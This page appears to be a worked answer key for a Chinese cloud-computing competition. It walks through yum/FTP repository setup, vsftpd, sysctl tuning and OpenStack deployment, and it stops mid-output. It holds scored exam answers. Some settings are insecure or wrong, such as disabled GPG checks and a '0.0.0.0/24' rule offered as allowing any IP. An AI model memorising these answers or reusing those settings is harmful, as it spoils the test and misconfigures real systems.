<h3 id="3-设置yum源"><a href="#3-设置yum源" class="headerlink" title="3.设置yum源"></a>3.设置yum源</h3><p>将controller节点和compute节点原有的yum源移动到&#x2F;home目录，为controller节点创建本地yum源,yum源文件名为local.repo;为compute节点创建ftp源，yum源文件名为ftp.repo，其中ftp服务器地址为controller节点,配置ftp源时不要写IP地址。</p>
<p>请将ftp.repo的内容提交至答题框。【0.5分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@compute ~]# <span class="built_in">cat</span> /etc/yum.repos.d/ftp.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=ftp://controller/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[iaas]</span><br><span class="line">name=iaas</span><br><span class="line">baseurl=ftp://controller/iaas/iaas-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure>

<p>过程：</p>
<p><strong>controller节点</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> /etc/yum.repos.d/* /home/</span><br><span class="line"><span class="comment">#编写本地yum源</span></span><br><span class="line">vi /etc/yum.repos.d/local.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=file:///opt/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[iaas]</span><br><span class="line">name=iaas</span><br><span class="line">baseurl=file:///opt/iaas/iaas-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure>

<p><strong>compute节点</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv /etc/yum.repos.d/* /home/</span><br><span class="line">vi /etc/yum.repos.d/ftp.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=ftp://controller/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[iaas]</span><br><span class="line">name=iaas</span><br><span class="line">baseurl=ftp://controller/iaas/iaas-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure>

<h3 id="4-搭建文件共享服务器"><a href="#4-搭建文件共享服务器" class="headerlink" title="4.搭建文件共享服务器"></a>4.搭建文件共享服务器</h3><p>在Controller节点上安装vsftp服务并设置开机自启动，将&#x2F;opt目录设为共享目录重启服务生效。</p>
<p>请将vsftp配置文件中修改的行提交至答题框。【0.5分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# <span class="built_in">cat</span> /etc/vsftpd/vsftpd.conf</span><br><span class="line">anon_root=/opt/</span><br></pre></td></tr></table></figure>

<p><strong>controller节点</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装vsftp</span></span><br><span class="line">yum install -y vsftpd</span><br><span class="line"><span class="comment">#修改配置文件</span></span><br><span class="line">vi /etc/vsftpd/vsftpd.conf</span><br><span class="line">anon_root=/opt/</span><br><span class="line"><span class="comment">#启动服务</span></span><br><span class="line">systemctl start vsftpd</span><br><span class="line">systemctl <span class="built_in">enable</span> vsftpd</span><br></pre></td></tr></table></figure>

<h3 id="5-系统调优-脏数据回写"><a href="#5-系统调优-脏数据回写" class="headerlink" title="5.系统调优-脏数据回写"></a>5.系统调优-脏数据回写</h3><p>Linux系统内存中会存在脏数据，一般系统默认脏数据30秒后会回写磁盘,修改配置文件，要求将回写磁盘的时间临时调整为60秒。</p>
<p>请使用sysctl -p命令将返回结果提交至答题框。【1分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# sysctl -p</span><br><span class="line">vm.dirty_expire_centisecs = 6000</span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#系统内部数据一般保存在/proc/sys/下,脏数据回写在/proc/sys/vm/vm.dirty_expire_centisecs</span></span><br><span class="line"><span class="comment">#sysctl -p 默认路径是 /etc/sysctl.conf，但是其文件在sys下寻找并修改配置文件，若要修改需要指定</span></span><br><span class="line">vi /etc/sysctl.conf</span><br><span class="line"> vm.dirty_expire_centisecs= 6000</span><br><span class="line">sysctl -p</span><br><span class="line">vm.dirty_expire_centisecs = 6000</span><br></pre></td></tr></table></figure>

<h2 id="任务2-OpenStack搭建任务（10分）"><a href="#任务2-OpenStack搭建任务（10分）" class="headerlink" title="任务2 OpenStack搭建任务（10分）"></a>任务2 OpenStack搭建任务（10分）</h2><p><strong>root密码以实际为准</strong></p>
<h3 id="1-修改变量文件"><a href="#1-修改变量文件" class="headerlink" title="1.修改变量文件"></a>1.修改变量文件</h3><p>在控制节点和计算节点上分别安装iaas-xiandian软件包，修改配置脚本文件中基本变量（配置脚本文件为&#x2F;etc&#x2F;xiandian&#x2F;openrc.sh)。修改完成后使用命令生效该变量文件，并然后执行echo $INTERFACE_IP命令。</p>
<p>请将echo $INTERFACE_IP命令的返回结果提交至答题框。【0.5分】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# echo $INTERFACE_IP</span><br><span class="line">192.168.100.10</span><br><span class="line">[root@compute ~]# echo $INTERFACE_IP</span><br><span class="line">192.168.100.20</span><br></pre></td></tr></table></figure>

<p>过程：</p>
<p><strong>controller</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yum install -y iaas-xiandian</span><br><span class="line">vi /etc/xiandian/openrc.sh</span><br><span class="line"><span class="comment">#将配置文件传到compute目录下</span></span><br><span class="line">scp /etc/xiandian/openrc.sh root@compute:/etc/xiandian/openrc.sh</span><br><span class="line"><span class="comment">#使配置文件生效</span></span><br><span class="line"><span class="built_in">source</span> /etc/xiandian/openrc.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$INTERFACE_IP</span></span><br><span class="line">  192.168.100.10</span><br></pre></td></tr></table></figure>

<p><strong>compute</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y iaas-xiandian</span><br><span class="line">#将配置文件的INTERFACE_IP改为compute的ip</span><br><span class="line">source /etc/xiandian/openrc.sh</span><br><span class="line">echo $INTERFACE_IP</span><br><span class="line">  192.168.100.20</span><br></pre></td></tr></table></figure>

<h3 id="2-controller节点和compute节点分别执行iaas-pre-host-sh脚本"><a href="#2-controller节点和compute节点分别执行iaas-pre-host-sh脚本" class="headerlink" title="2.controller节点和compute节点分别执行iaas-pre-host.sh脚本"></a>2.controller节点和compute节点分别执行iaas-pre-host.sh脚本</h3><p>请将执行sh文件的命令提交至答题框。【1分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">iaas-pre-host.sh</span><br></pre></td></tr></table></figure>

<h3 id="3-搭建数据库组件"><a href="#3-搭建数据库组件" class="headerlink" title="3.搭建数据库组件"></a>3.搭建数据库组件</h3><p>执行iaas-install-mysql.sh脚本，在controller节点会自行安装mariadb、memcached、rabbitmq等服务和完成相关配置。执行完成后修改配置文件将memcached最大连接数修改为2048。</p>
<p>请将ps aux | grep memcached命令的返回结果提交至答题框。【1分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller sysconfig]# ps aux | grep memcached</span><br><span class="line">memcach+  25218  0.0  0.1 443040  4212 ?        Ssl  16:36   0:00 /usr/bin/memcached -p 11211 -u memcached -m</span><br><span class="line">root      25232  0.0  0.0 112720   984 pts/1    S+   16:36   0:00 grep --color=auto memcached</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#执行脚本</span></span><br><span class="line">iaas-install-mysql.sh</span><br><span class="line"><span class="comment">#修改配置文件</span></span><br><span class="line"><span class="built_in">cd</span> /etc/sysconfig/</span><br><span class="line">vi memcached</span><br><span class="line">MAXCONN=<span class="string">&quot;2048&quot;</span></span><br><span class="line"><span class="comment">#重启服务</span></span><br><span class="line">systemctl restart memcached</span><br><span class="line"><span class="comment">#查看</span></span><br><span class="line"> ps aux | grep memcached</span><br><span class="line">memcach+  25218  0.0  0.1 443040  4212 ?        Ssl  16:36   0:00 /usr/bin/memcached -p 11211 -u memcached -m 64 -c 2048 -l 127.0.0.1,::1,controller</span><br><span class="line">root      25232  0.0  0.0 112720   984 pts/1    S+   16:36   0:00 grep --color=auto memcached</span><br></pre></td></tr></table></figure>

<h3 id="4-搭建认证服务组件"><a href="#4-搭建认证服务组件" class="headerlink" title="4.搭建认证服务组件"></a>4.搭建认证服务组件</h3><p>执行iaas-install-keystone.sh脚本，在controller节点上会自行安装keystone服务和完成相关配置。完成后使用openstack命令查看当前用户列表。</p>
<p>请将openstack查看用户列表的命令提交至答题框。【1分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller sysconfig]# openstack user list</span><br><span class="line">+----------------------------------+-------+</span><br><span class="line">| ID                               | Name  |</span><br><span class="line">+----------------------------------+-------+</span><br><span class="line">| c75f855190ab4f50b9b7175ea8a90b44 | admin |</span><br><span class="line">| fb61c950d2874cafaff6e57f406e103b | demo  |</span><br><span class="line">+----------------------------------+-------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装脚本</span></span><br><span class="line">iaas-install-keystone.sh</span><br><span class="line"><span class="comment">#生效身份验证</span></span><br><span class="line"><span class="built_in">source</span> /etc/keystone/admin-openrc.sh</span><br><span class="line"><span class="comment">#查看用户列表</span></span><br><span class="line">openstack user list</span><br><span class="line">+----------------------------------+-------+</span><br><span class="line">| ID                               | Name  |</span><br><span class="line">+----------------------------------+-------+</span><br><span class="line">| c75f855190ab4f50b9b7175ea8a90b44 | admin |</span><br><span class="line">| fb61c950d2874cafaff6e57f406e103b | demo  |</span><br><span class="line">+----------------------------------+-------+</span><br></pre></td></tr></table></figure>

<h3 id="5-搭建镜像服务组件"><a href="#5-搭建镜像服务组件" class="headerlink" title="5.搭建镜像服务组件"></a>5.搭建镜像服务组件</h3><p>执行iaas-install-glance.sh脚本，在controller 节点会自行安装glance服务和完成相关配置。完成后使用openstack命令将cirros-0.3.4-x86_64-disk.img上传到controller节点的&#x2F;root目录下，并命名为cirros。</p>
<p>请将镜像上传的操作命令和返回结果提交至答题框。【1分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller sysconfig]# openstack image create cirros --disk-format qcow2 --container bare --file /root/cirros-0.3.4-x86_64-disk.img</span><br><span class="line">+------------------+------------------------------------------------------+</span><br><span class="line">| Field            | Value                                                |</span><br><span class="line">+------------------+------------------------------------------------------+</span><br><span class="line">| checksum         | ee1eca47dc88f4879d8a229cc70a07c6                     |</span><br><span class="line">| container_format | bare                                                 |</span><br><span class="line">| created_at       | 2022-10-08T08:56:01Z                                 |</span><br><span class="line">| disk_format      | qcow2                                                |</span><br><span class="line">| file             | /v2/images/70344b58-7c4f-43b0-b5de-15dd898d1293/file |</span><br><span class="line">| <span class="built_in">id</span>               | 70344b58-7c4f-43b0-b5de-15dd898d1293                 |</span><br><span class="line">| min_disk         | 0                                                    |</span><br><span class="line">| min_ram          | 0                                                    |</span><br><span class="line">| name             | cirros                                               |</span><br><span class="line">| owner            | e6dc2936211947c3b924187b48ffa8fb                     |</span><br><span class="line">| protected        | False                                                |</span><br><span class="line">| schema           | /v2/schemas/image                                    |</span><br><span class="line">| size             | 13287936                                             |</span><br><span class="line">| status           | active                                               |</span><br><span class="line">| tags             |                                                      |</span><br><span class="line">| updated_at       | 2022-10-08T08:56:01Z                                 |</span><br><span class="line">| virtual_size     | None                                                 |</span><br><span class="line">| visibility       | shared                                               |</span><br><span class="line">+------------------+------------------------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#执行脚本</span></span><br><span class="line">iaas-install-glance.sh</span><br><span class="line"><span class="comment">#上传镜像</span></span><br><span class="line">openstack image create cirros --disk-format qcow2 --container bare --file /root/cirros-0.3.4-x86_64-disk.img</span><br></pre></td></tr></table></figure>

<h3 id="6-搭建计算服务组件"><a href="#6-搭建计算服务组件" class="headerlink" title="6.搭建计算服务组件"></a>6.搭建计算服务组件</h3><p>在controller节点和compute节点分别执行iaas-install-nova-controller.sh和iaas-install-nova-compute.sh脚本，会自行安装nova服务和完成相关配置。然后使用命令列出能提供计算资源的节点。</p>
<p>请将nova service-list命令的返回结果提交至答题框。【2分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller sysconfig]# nova service-list</span><br><span class="line">+--------------------------------------+------------------+------------+----------+---------+-------+----------------------------+-----------------+-------------+</span><br><span class="line">| Id                                   | Binary           | Host       | Zone     | Status  | State | Updated_at                 | Disabled Reason | Forced down |</span><br><span class="line">+--------------------------------------+------------------+------------+----------+---------+-------+----------------------------+-----------------+-------------+</span><br><span class="line">| c6a665b2-2cd7-44ca-9d75-32e7da6f4acf | nova-scheduler   | controller | internal | enabled | up    | 2022-10-08T09:07:15.000000 | -               | False       |</span><br><span class="line">| ce9d4037-9d16-4f16-8bbd-7015ddc74345 | nova-consoleauth | controller | internal | enabled | up    | 2022-10-08T09:07:15.000000 | -               | False       |</span><br><span class="line">| 8697a2e3-e5da-4f53-bc0d-e56f338027a5 | nova-conductor   | controller | internal | enabled | up    | 2022-10-08T09:07:16.000000 | -               | False       |</span><br><span class="line">| fc6eb5ca-c245-47f6-b9d9-24426f269e3f | nova-compute     | compute    | nova     | enabled | up    | 2022-10-08T09:07:19.000000 | -               | False       |</span><br><span class="line">| 1bd34d8c-ff2a-4c64-b426-a41dacf04bc2 | nova-compute     | controller | nova     | enabled | up    | 2022-10-08T09:07:22.000000 | -               | False       |</span><br><span class="line">+--------------------------------------+------------------+------------+----------+---------+-------+----------------------------+-----------------+-------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过程</p>
<p><strong>controller</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iaas-install-nova-controller.sh</span><br><span class="line">#修改配置文件</span><br><span class="line">vi /etc/xiandian/openrc.sh</span><br><span class="line">iaas-install-nova-compute.sh</span><br><span class="line">#修改完配置文件后改回</span><br></pre></td></tr></table></figure>

<p><strong>compute</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iaas-install-nova-compute</span><br></pre></td></tr></table></figure>

<p><strong>controller：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nova service-list</span><br></pre></td></tr></table></figure>

<h3 id="7-搭建网络组件并初始化网络"><a href="#7-搭建网络组件并初始化网络" class="headerlink" title="7.搭建网络组件并初始化网络"></a>7.搭建网络组件并初始化网络</h3><p>在controller节点和compute节点分别执行iaas-install-neutron-controller.sh和iaas-install-neutron-compute.sh脚本，会自行安装neutron 服务并完成配置。创建云主机外部网络ext-net，子网为ext-subnet，云主机浮动IP可用网段为192.168.10.100<del>192.168.10.200，网关为192.168.10.1。创建云主机内部网络int-net1，子网为int-subnet1，云主机子网IP可用网段为10.0.0.100</del>10.0.0.200，网关为10.0.0.1;创建云主机内部网络int-net2，子网为int-subnet2，云主机子网IP可用网段为10.0.1.100 ~10.0.1.200，网关为10.0.1.1。添加名为ext-router的路由器，添加网关在ext-net网络，添加内部端口到int-net1 网络，完成内部网络int-net1和外部网络的连通。</p>
<p>请使用openstack命令完成以上任务，完成后将命令和返回结果提交至答题框。【3分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在两个节点使用对应的脚本</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#创建外部网络并绑定网段</span></span><br><span class="line">openstack network create ext-net --provider-physical-network provider --external --enable-port-security --<span class="built_in">enable</span>  --provider-network-type flat</span><br><span class="line">+---------------------------+--------------------------------------+</span><br><span class="line">| Field                     | Value                                |</span><br><span class="line">+---------------------------+--------------------------------------+</span><br><span class="line">| admin_state_up            | UP                                   |</span><br><span class="line">| availability_zone_hints   |                                      |</span><br><span class="line">| availability_zones        |                                      |</span><br><span class="line">| created_at                | 2022-10-09T02:59:57Z                 |</span><br><span class="line">| description               |                                      |</span><br><span class="line">| dns_domain                | None                                 |</span><br><span class="line">| <span class="built_in">id</span>                        | 01fb1dc8-66f3-4045-84dc-cdc0cb69bede |</span><br><span class="line">| ipv4_address_scope        | None                                 |</span><br><span class="line">| ipv6_address_scope        | None                                 |</span><br><span class="line">| is_default                | False                                |</span><br><span class="line">| is_vlan_transparent       | None                                 |</span><br><span class="line">| mtu                       | 1500                                 |</span><br><span class="line">| name                      | ext-net                              |</span><br><span class="line">| port_security_enabled     | True                                 |</span><br><span class="line">| project_id                | e6dc2936211947c3b924187b48ffa8fb     |</span><br><span class="line">| provider:network_type     | flat                                 |</span><br><span class="line">| provider:physical_network | provider                             |</span><br><span class="line">| provider:segmentation_id  | None                                 |</span><br><span class="line">| qos_policy_id             | None                                 |</span><br><span class="line">| revision_number           | 5                                    |</span><br><span class="line">| router:external           | External                             |</span><br><span class="line">| segments                  | None                                 |</span><br><span class="line">| shared                    | False                                |</span><br><span class="line">| status                    | ACTIVE                               |</span><br><span class="line">| subnets                   |                                      |</span><br><span class="line">| tags                      |                                      |</span><br><span class="line">| updated_at                | 2022-10-09T02:59:57Z                 |</span><br><span class="line">+---------------------------+--------------------------------------+</span><br><span class="line">openstack subnet create ext-subnet --network ext-net  --dhcp --gateway 192.168.10.1  --subnet-range 192.168.10.0/24 --allocation-pool start=192.168.10.100,end=192.168.10.200</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line">| Field             | Value                                |</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line">| allocation_pools  | 192.168.10.100-192.168.10.200        |</span><br><span class="line">| cidr              | 192.168.10.0/24                      |</span><br><span class="line">| created_at        | 2022-10-09T03:01:56Z                 |</span><br><span class="line">| description       |                                      |</span><br><span class="line">| dns_nameservers   |                                      |</span><br><span class="line">| enable_dhcp       | True                                 |</span><br><span class="line">| gateway_ip        | 192.168.10.1                         |</span><br><span class="line">| host_routes       |                                      |</span><br><span class="line">| <span class="built_in">id</span>                | 4b633ced-be54-4af4-a536-8f94f0c694bf |</span><br><span class="line">| ip_version        | 4                                    |</span><br><span class="line">| ipv6_address_mode | None                                 |</span><br><span class="line">| ipv6_ra_mode      | None                                 |</span><br><span class="line">| name              | ext-subnet                           |</span><br><span class="line">| network_id        | 01fb1dc8-66f3-4045-84dc-cdc0cb69bede |</span><br><span class="line">| project_id        | e6dc2936211947c3b924187b48ffa8fb     |</span><br><span class="line">| revision_number   | 0                                    |</span><br><span class="line">| segment_id        | None                                 |</span><br><span class="line">| service_types     |                                      |</span><br><span class="line">| subnetpool_id     | None                                 |</span><br><span class="line">| tags              |                                      |</span><br><span class="line">| updated_at        | 2022-10-09T03:01:56Z                 |</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line"><span class="comment">#创建内网1，内网2并绑定</span></span><br><span class="line"></span><br><span class="line">openstack network create --internal int-net1</span><br><span class="line">+---------------------------+--------------------------------------+</span><br><span class="line">| Field                     | Value                                |</span><br><span class="line">+---------------------------+--------------------------------------+</span><br><span class="line">| admin_state_up            | UP                                   |</span><br><span class="line">| availability_zone_hints   |                                      |</span><br><span class="line">| availability_zones        |                                      |</span><br><span class="line">| created_at                | 2022-10-09T03:02:27Z                 |</span><br><span class="line">| description               |                                      |</span><br><span class="line">| dns_domain                | None                                 |</span><br><span class="line">| <span class="built_in">id</span>                        | 43b5b4a9-1846-4489-8521-acdf2f96453e |</span><br><span class="line">| ipv4_address_scope        | None                                 |</span><br><span class="line">| ipv6_address_scope        | None                                 |</span><br><span class="line">| is_default                | False                                |</span><br><span class="line">| is_vlan_transparent       | None                                 |</span><br><span class="line">| mtu                       | 1450                                 |</span><br><span class="line">| name                      | int-net1                             |</span><br><span class="line">| port_security_enabled     | True                                 |</span><br><span class="line">| project_id                | e6dc2936211947c3b924187b48ffa8fb     |</span><br><span class="line">| provider:network_type     | vxlan                                |</span><br><span class="line">| provider:physical_network | None                                 |</span><br><span class="line">| provider:segmentation_id  | 161                                  |</span><br><span class="line">| qos_policy_id             | None                                 |</span><br><span class="line">| revision_number           | 2                                    |</span><br><span class="line">| router:external           | Internal                             |</span><br><span class="line">| segments                  | None                                 |</span><br><span class="line">| shared                    | False                                |</span><br><span class="line">| status                    | ACTIVE                               |</span><br><span class="line">| subnets                   |                                      |</span><br><span class="line">| tags                      |                                      |</span><br><span class="line">| updated_at                | 2022-10-09T03:02:27Z                 |</span><br><span class="line">+---------------------------+--------------------------------------+</span><br><span class="line">[root@controller ~]# openstack network create --internal int-net2</span><br><span class="line">+---------------------------+--------------------------------------+</span><br><span class="line">| Field                     | Value                                |</span><br><span class="line">+---------------------------+--------------------------------------+</span><br><span class="line">| admin_state_up            | UP                                   |</span><br><span class="line">| availability_zone_hints   |                                      |</span><br><span class="line">| availability_zones        |                                      |</span><br><span class="line">| created_at                | 2022-10-09T03:02:31Z                 |</span><br><span class="line">| description               |                                      |</span><br><span class="line">| dns_domain                | None                                 |</span><br><span class="line">| <span class="built_in">id</span>                        | ea39aff1-bd51-443b-83e9-c573812a1dd7 |</span><br><span class="line">| ipv4_address_scope        | None                                 |</span><br><span class="line">| ipv6_address_scope        | None                                 |</span><br><span class="line">| is_default                | False                                |</span><br><span class="line">| is_vlan_transparent       | None                                 |</span><br><span class="line">| mtu                       | 1450                                 |</span><br><span class="line">| name                      | int-net2                             |</span><br><span class="line">| port_security_enabled     | True                                 |</span><br><span class="line">| project_id                | e6dc2936211947c3b924187b48ffa8fb     |</span><br><span class="line">| provider:network_type     | vxlan                                |</span><br><span class="line">| provider:physical_network | None                                 |</span><br><span class="line">| provider:segmentation_id  | 195                                  |</span><br><span class="line">| qos_policy_id             | None                                 |</span><br><span class="line">| revision_number           | 2                                    |</span><br><span class="line">| router:external           | Internal                             |</span><br><span class="line">| segments                  | None                                 |</span><br><span class="line">| shared                    | False                                |</span><br><span class="line">| status                    | ACTIVE                               |</span><br><span class="line">| subnets                   |                                      |</span><br><span class="line">| tags                      |                                      |</span><br><span class="line">| updated_at                | 2022-10-09T03:02:31Z                 |</span><br><span class="line">+---------------------------+--------------------------------------+</span><br><span class="line">[root@controller ~]# openstack subnet create int-subnet1 --network int-net1  --dhcp --gateway 10.0.0.1  --subnet-range 10.0.0.0/24 --allocation-pool start=10.0.0.100,end=10.0.0.200</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line">| Field             | Value                                |</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line">| allocation_pools  | 10.0.0.100-10.0.0.200                |</span><br><span class="line">| cidr              | 10.0.0.0/24                          |</span><br><span class="line">| created_at        | 2022-10-09T03:05:35Z                 |</span><br><span class="line">| description       |                                      |</span><br><span class="line">| dns_nameservers   |                                      |</span><br><span class="line">| enable_dhcp       | True                                 |</span><br><span class="line">| gateway_ip        | 10.0.0.1                             |</span><br><span class="line">| host_routes       |                                      |</span><br><span class="line">| <span class="built_in">id</span>                | d56b1e12-c37a-4ba1-9323-249b0e74e8b3 |</span><br><span class="line">| ip_version        | 4                                    |</span><br><span class="line">| ipv6_address_mode | None                                 |</span><br><span class="line">| ipv6_ra_mode      | None                                 |</span><br><span class="line">| name              | int-subnet1                          |</span><br><span class="line">| network_id        | 43b5b4a9-1846-4489-8521-acdf2f96453e |</span><br><span class="line">| project_id        | e6dc2936211947c3b924187b48ffa8fb     |</span><br><span class="line">| revision_number   | 0                                    |</span><br><span class="line">| segment_id        | None                                 |</span><br><span class="line">| service_types     |                                      |</span><br><span class="line">| subnetpool_id     | None                                 |</span><br><span class="line">| tags              |                                      |</span><br><span class="line">| updated_at        | 2022-10-09T03:05:35Z                 |</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line">[root@controller ~]# openstack subnet create int-subnet2 --network int-net2  --dhcp --gateway 10.0.1.1  --subnet-range 10.0.1.0/24 --allocation-pool start=10.0.1.100,end=10.0.1.200</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line">| Field             | Value                                |</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line">| allocation_pools  | 10.0.1.100-10.0.1.200                |</span><br><span class="line">| cidr              | 10.0.1.0/24                          |</span><br><span class="line">| created_at        | 2022-10-09T03:06:02Z                 |</span><br><span class="line">| description       |                                      |</span><br><span class="line">| dns_nameservers   |                                      |</span><br><span class="line">| enable_dhcp       | True                                 |</span><br><span class="line">| gateway_ip        | 10.0.1.1                             |</span><br><span class="line">| host_routes       |                                      |</span><br><span class="line">| <span class="built_in">id</span>                | 3c8fbeb8-c4ec-41d4-b2d2-eac146b82eac |</span><br><span class="line">| ip_version        | 4                                    |</span><br><span class="line">| ipv6_address_mode | None                                 |</span><br><span class="line">| ipv6_ra_mode      | None                                 |</span><br><span class="line">| name              | int-subnet2                          |</span><br><span class="line">| network_id        | ea39aff1-bd51-443b-83e9-c573812a1dd7 |</span><br><span class="line">| project_id        | e6dc2936211947c3b924187b48ffa8fb     |</span><br><span class="line">| revision_number   | 0                                    |</span><br><span class="line">| segment_id        | None                                 |</span><br><span class="line">| service_types     |                                      |</span><br><span class="line">| subnetpool_id     | None                                 |</span><br><span class="line">| tags              |                                      |</span><br><span class="line">| updated_at        | 2022-10-09T03:06:02Z                 |</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#创建路由，并联通外部</span></span><br><span class="line">[root@controller ~]# openstack router create ext-router --<span class="built_in">enable</span></span><br><span class="line">+-------------------------+--------------------------------------+</span><br><span class="line">| Field                   | Value                                |</span><br><span class="line">+-------------------------+--------------------------------------+</span><br><span class="line">| admin_state_up          | UP                                   |</span><br><span class="line">| availability_zone_hints |                                      |</span><br><span class="line">| availability_zones      |                                      |</span><br><span class="line">| created_at              | 2022-10-09T03:07:38Z                 |</span><br><span class="line">| description             |                                      |</span><br><span class="line">| distributed             | False                                |</span><br><span class="line">| external_gateway_info   | None                                 |</span><br><span class="line">| flavor_id               | None                                 |</span><br><span class="line">| ha                      | False                                |</span><br><span class="line">| <span class="built_in">id</span>                      | b6ec9db2-2a00-438f-bd07-fa433647d0d4 |</span><br><span class="line">| name                    | ext-router                           |</span><br><span class="line">| project_id              | e6dc2936211947c3b924187b48ffa8fb     |</span><br><span class="line">| revision_number         | 1                                    |</span><br><span class="line">| routes                  |                                      |</span><br><span class="line">| status                  | ACTIVE                               |</span><br><span class="line">| tags                    |                                      |</span><br><span class="line">| updated_at              | 2022-10-09T03:07:38Z                 |</span><br><span class="line">+-------------------------+--------------------------------------+</span><br><span class="line">[root@controller ~]# openstack router <span class="built_in">set</span> ext-router --external-gateway ext-net  --enable-snat</span><br><span class="line">[root@controller ~]# openstack router  add subnet ext-router int-subnet1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="任务3-OpenStack运维任务"><a href="#任务3-OpenStack运维任务" class="headerlink" title="任务3 OpenStack运维任务"></a>任务3 OpenStack运维任务</h2><h3 id="1-使用openstack图形界面创建镜像，镜像名称为nginx-源使用nginx-centos-qcow2"><a href="#1-使用openstack图形界面创建镜像，镜像名称为nginx-源使用nginx-centos-qcow2" class="headerlink" title="1.使用openstack图形界面创建镜像，镜像名称为nginx,源使用nginx-centos.qcow2"></a>1.使用openstack图形界面创建镜像，镜像名称为nginx,源使用nginx-centos.qcow2</h3><p>请将镜像截图提交至答题框。【1分】</p>
<p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20221009113129848.png" alt="image-20221009113129848"></p>
<p>操作步骤：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">登录OpenStack，创建镜像，源镜像为nginx-centos.qcow2，名臣为nginx，创建完成</span><br></pre></td></tr></table></figure>

<h3 id="⒉-使用命令创建名称为group-web的安全组该安全组的描述为工位号，为该安全组添加规则允许任意ip地址访问web-并写出添加访问SSH-22-的命令。"><a href="#⒉-使用命令创建名称为group-web的安全组该安全组的描述为工位号，为该安全组添加规则允许任意ip地址访问web-并写出添加访问SSH-22-的命令。" class="headerlink" title="⒉.使用命令创建名称为group_web的安全组该安全组的描述为工位号，为该安全组添加规则允许任意ip地址访问web,并写出添加访问SSH (22)的命令。"></a>⒉.使用命令创建名称为group_web的安全组该安全组的描述为工位号，为该安全组添加规则允许任意ip地址访问web,并写出添加访问SSH (22)的命令。</h3><p>请将添加访问SSH (22)的命令提交至答题框。【1分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack security group rule create group_web --ingress  --dst-port 22:22 --remote-ip 0.0.0.0/24</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line">| Field             | Value                                |</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line">| created_at        | 2022-10-09T03:48:08Z                 |</span><br><span class="line">| description       |                                      |</span><br><span class="line">| direction         | ingress                              |</span><br><span class="line">| ether_type        | IPv4                                 |</span><br><span class="line">| <span class="built_in">id</span>                | 03c7ce48-4ada-4f9d-bd0c-c80454d57f94 |</span><br><span class="line">| name              | None                                 |</span><br><span class="line">| port_range_max    | 22                                   |</span><br><span class="line">| port_range_min    | 22                                   |</span><br><span class="line">| project_id        | e6dc2936211947c3b924187b48ffa8fb     |</span><br><span class="line">| protocol          | tcp                                  |</span><br><span class="line">| remote_group_id   | None                                 |</span><br><span class="line">| remote_ip_prefix  | 0.0.0.0/24                           |</span><br><span class="line">| revision_number   | 0                                    |</span><br><span class="line">| security_group_id | 